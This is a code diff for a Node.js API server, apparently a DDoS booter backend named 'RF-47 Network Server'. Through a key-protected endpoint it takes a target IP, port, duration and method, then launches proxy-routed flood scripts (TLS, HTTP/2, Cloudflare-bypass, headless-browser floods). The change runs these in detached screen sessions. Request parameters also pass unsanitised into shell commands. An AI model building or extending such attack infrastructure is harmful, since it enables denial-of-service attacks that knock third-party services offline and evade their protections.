@@ -67,7 +67,6 @@ function verifyApiKey(req, res, next) {
 
 // ==================== CLEAN PROXY FUNCTION (KHUSUS TLSV2) ====================
 function cleanProxyUrl(proxy) {
-    // Remove http://, https://, socks4://, socks5:// prefixes
     let cleanProxy = proxy.replace(/^(https?:\/\/|socks[45]:\/\/)/i, '');
     return cleanProxy;
 }
@@ -93,8 +92,6 @@ async function updateProxies() {
             if (!line.trim()) continue;
             let proxy = line.trim();
 
-            // SIMPAN PROXY DENGAN PREFIX ASLI (untuk method TLS, CF, FAST, BROWSER)
-            // Jika tidak ada prefix, tambahkan http:// sebagai default
             if (!proxy.includes('://')) {
                 proxy = `http://${proxy}`;
             }
@@ -120,13 +117,10 @@ async function updateProxies() {
 function getCleanProxiesForTLSV2() {
     if (!fs.existsSync(PROXY_FILE)) return [];
 
-    // Baca proxy dari file utama
     let proxies = fs.readFileSync(PROXY_FILE, 'utf8').split('\n').filter(p => p.trim());
 
-    // Clean proxy (hapus semua prefix http://, https://, socks4://, socks5://)
     const cleanProxies = proxies.map(p => cleanProxyUrl(p));
 
-    // Simpan ke file temporary khusus TLSV2
     const tlsv2ProxyFile = path.join(SCRIPTS_DIR, 'proxy_tlsv2_clean.txt');
     fs.writeFileSync(tlsv2ProxyFile, cleanProxies.join('\n'));
 
@@ -155,6 +149,32 @@ function createDefaultUaFile() {
     }
 }
 
+// ==================== FUNGSI RUN DENGAN SCREEN (RINGAN & AUTO STOP) ====================
+function runWithScreen(command, method, target, duration) {
+    const timestamp = Date.now();
+    const sessionName = `${method}_${timestamp}`;
+    
+    // Jalankan screen di background
+    exec(`screen -dmS ${sessionName} ${command}`, (error) => {
+        if (error) {
+            console.log(`[SCREEN ERROR] ${error.message}`);
+        } else {
+            console.log(`[SCREEN] ✅ Started: ${sessionName} (will run for ${duration}s)`);
+        }
+    });
+    
+    // Auto kill setelah duration + 5 detik buffer
+    setTimeout(() => {
+        exec(`screen -S ${sessionName} -X quit`, (err) => {
+            if (!err) {
+                console.log(`[SCREEN] 🛑 Stopped: ${sessionName} (completed ${duration}s)`);
+            }
+        });
+    }, (duration + 5) * 1000);
+    
+    return sessionName;
+}
+
 // ==================== API ENDPOINT ====================
 app.get('/api', verifyApiKey, async (req, res) => {
     let { ip, method, port, time, threads, connections, streams, fingerprint, extra, rate, browser_count, conn_timeout, rps } = req.query;
@@ -173,7 +193,6 @@ app.get('/api', verifyApiKey, async (req, res) => {
     const fingerprintEnabled = fingerprint === 'true' || fingerprint === true;
     const extraEnabled = extra === 'true' || extra === true;
 
-    // Browser method specific parameters
     const parsedBrowserCount = browser_count ? parseInt(browser_count) : 5;
     const parsedConnTimeout = conn_timeout ? parseInt(conn_timeout) : 30000;
     const parsedRps = rps ? parseInt(rps) : 10;
@@ -206,8 +225,8 @@ app.get('/api', verifyApiKey, async (req, res) => {
 
     let command = '';
     let scriptPath = '';
+    let sessionName = '';
 
-    // Method TLS (TCP/TLS Flood via proxy) - PAKAI PROXY DENGAN PREFIX
     if (normalizedMethod === 'tls') {
         scriptPath = path.join(SCRIPTS_DIR, 'TLS.js');
         if (!fs.existsSync(scriptPath)) {
@@ -215,47 +234,46 @@ app.get('/api', verifyApiKey, async (req, res) => {
         }
         const concurrent = 5;
         command = `node ${scriptPath} ${ip} ${parsedPort} ${PROXY_FILE} ${concurrent} ${parsedTime}`;
-        console.log(`[TLS] Using proxies with prefixes (http://, socks://, etc)`);
+        console.log(`[TLS] Using proxies with prefixes`);
+        
+        sessionName = runWithScreen(command, 'tls', ip, parsedTime);
 
-        // Method TLSV2 (HTTP2 Flood via proxy) - KHUSUS PAKAI CLEAN PROXY (TANPA PREFIX)
     } else if (normalizedMethod === 'tlsv3') {
         scriptPath = path.join(SCRIPTS_DIR, 'TLSV3.js');
         if (!fs.existsSync(scriptPath)) {
-            return res.status(404).json({ error: 'TLS.js not found' });
+            return res.status(404).json({ error: 'TLSV3.js not found' });
         }
         const concurrent = 5;
         command = `node ${scriptPath} ${ip} ${parsedPort} ${PROXY_FILE} ${concurrent} ${parsedTime}`;
-        console.log(`[TLS] Using proxies with prefixes (http://, socks://, etc)`);
+        console.log(`[TLSV3] Using proxies with prefixes`);
+        
+        sessionName = runWithScreen(command, 'tlsv3', ip, parsedTime);
 
-        // Method TLSV2 (HTTP2 Flood via proxy) - KHUSUS PAKAI CLEAN PROXY (TANPA PREFIX)
-    }else if (normalizedMethod === 'tlsv2') {
+    } else if (normalizedMethod === 'tlsv2') {
         scriptPath = path.join(SCRIPTS_DIR, 'TLSV2.js');
         if (!fs.existsSync(scriptPath)) {
             return res.status(404).json({ error: 'TLSV2.js not found' });
         }
 
-        // Dapatkan file proxy yang sudah dibersihkan (tanpa prefix)
         const cleanProxyFile = getCleanProxiesForTLSV2();
         const rateParam = 120;
         command = `node ${scriptPath} ${target} ${parsedTime} 32 4 ${cleanProxyFile}`;
+        console.log(`[TLSV2] Using CLEAN proxies`);
+        
+        sessionName = runWithScreen(command, 'tlsv2', ip, parsedTime);
 
-        console.log(`[TLSV2] Using CLEAN proxies (without http://, https://, socks4://, socks5:// prefixes)`);
-
-        // Method CF (Cloudflare Bypass) - PAKAI PROXY DENGAN PREFIX
     } else if (normalizedMethod === 'cf') {
-        scriptPath = path.join(SCRIPTS_DIR, 'CF-BYPASS.js');
-        if (!fs.existsSync(scriptPath)) {
-            return res.status(404).json({ error: 'CF-BYPASS.js not found' });
-        }
-        const methodType = 'POST';
-        const rateParam = 100;
-        const randomLength = 10;
-        const randomType = 'y';
-        command = `node ${scriptPath} ${methodType} ${target} ${parsedTime} ${parsedThreads} ${rateParam} ${PROXY_FILE} ${randomLength} ${randomType}`;
-        console.log(`[CF] Using proxies with prefixes`);
-
-        // Method FAST / H2-FAST - PAKAI PROXY DENGAN PREFIX
-    } else if (normalizedMethod === 'fast' || normalizedMethod === 'h2fast') {
+    scriptPath = path.join(SCRIPTS_DIR, 'cf.js');
+    if (!fs.existsSync(scriptPath)) {
+        return res.status(404).json({ error: 'cf.js not found' });
+    }
+    
+    // Format yang benar: node CF-BYPASS.js <url> <time> <proxyFile>
+    command = `node ${scriptPath} ${target} ${parsedTime} ${PROXY_FILE}`;
+    console.log(`[CF] Using proxies with prefixes`);
+    
+    sessionName = runWithScreen(command, 'cf', ip, parsedTime);
+} else if (normalizedMethod === 'fast' || normalizedMethod === 'h2fast') {
         scriptPath = path.join(SCRIPTS_DIR, 'CF-BYPASS.js');
         if (!fs.existsSync(scriptPath)) {
             return res.status(404).json({ error: 'CF-BYPASS.js (H2-FAST) not found' });
@@ -284,33 +302,30 @@ app.get('/api', verifyApiKey, async (req, res) => {
         if (req.query.referer) command += ` --referer ${req.query.referer}`;
 
         console.log(`[FAST] Using proxies with prefixes`);
+        
+        sessionName = runWithScreen(command, 'fast', ip, parsedTime);
 
-        // Method BROWSER - PAKAI PROXY DENGAN PREFIX
     } else if (normalizedMethod === 'browser') {
         scriptPath = path.join(SCRIPTS_DIR, 'Browser.js');
         if (!fs.existsSync(scriptPath)) {
             return res.status(404).json({ error: 'Browser.js not found' });
         }
 
-        // Format: node Browser.js <target> <time> <browser_counts> <httpversion> <conn_timeout> <rps> <proxyfile>
         const httpVersion = req.query.http_version || 'HTTP/1.1';
         command = `node ${scriptPath} ${target} ${parsedTime} ${parsedBrowserCount} ${httpVersion} ${parsedConnTimeout} ${parsedRps} ${PROXY_FILE}`;
 
-        console.log(`[BROWSER] Browser Count: ${parsedBrowserCount}, Timeout: ${parsedConnTimeout}ms, RPS: ${parsedRps}`);
-        console.log(`[BROWSER] Using proxies with prefixes`);
+        console.log(`[BROWSER] Browser Count: ${parsedBrowserCount}`);
+        
+        sessionName = runWithScreen(command, 'browser', ip, parsedTime);
 
     } else {
         return res.status(400).json({
-            error: 'Unknown method. Use: tls, tlsv2, cf, fast, or browser',
-            available_methods: ['tls', 'tlsv2', 'cf', 'fast', 'browser']
+            error: 'Unknown method. Use: tls, tlsv2, tlsv3, cf, fast, or browser',
+            available_methods: ['tls', 'tlsv2', 'tlsv3', 'cf', 'fast', 'browser']
         });
     }
 
     console.log(`[RUN] ${normalizedMethod} | ${ip}:${parsedPort} | ${parsedTime}s | Threads: ${parsedThreads}`);
-    console.log(`[CMD] ${command}`);
-
-    const child = exec(command, { timeout: (parsedTime + 30) * 1000 });
-    child.unref();
 
     res.json({
         status: 'ok',
@@ -323,6 +338,7 @@ app.get('/api', verifyApiKey, async (req, res) => {
         rate: parsedRate,
         fingerprint: fingerprintEnabled,
         extra: extraEnabled,
+        screen_session: sessionName,
         ...(normalizedMethod === 'browser' && {
             browser_count: parsedBrowserCount,
             conn_timeout: parsedConnTimeout,
@@ -342,7 +358,7 @@ app.get('/health', (req, res) => {
         proxies: proxyCount,
         ping_enabled: PING_ENABLED,
         ping_url: `https://${SERVER_DOMAIN}`,
-        available_methods: ['tls', 'tlsv2', 'cf', 'fast', 'browser'],
+        available_methods: ['tls', 'tlsv2', 'tlsv3', 'cf', 'fast', 'browser'],
         proxy_rules: {
             tlsv2: 'Clean proxies (no http://, https://, socks4://, socks5://)',
             others: 'Proxies with prefixes (as downloaded)'
@@ -356,7 +372,7 @@ app.listen(PORT, () => {
     console.log(`RF-47 Network Server Started`);
     console.log(`Port: ${PORT}`);
     console.log(`API Key: ${API_KEY}`);
-    console.log(`Methods: tls, tlsv2, cf, fast, browser`);
+    console.log(`Methods: tls, tlsv2, tlsv3, cf, fast, browser`);
     console.log(`========================================`);
     console.log(`Proxy Rules:`);
     console.log(`  - TLSV2: CLEAN proxies (without http://, https://, socks4://, socks5://)`);
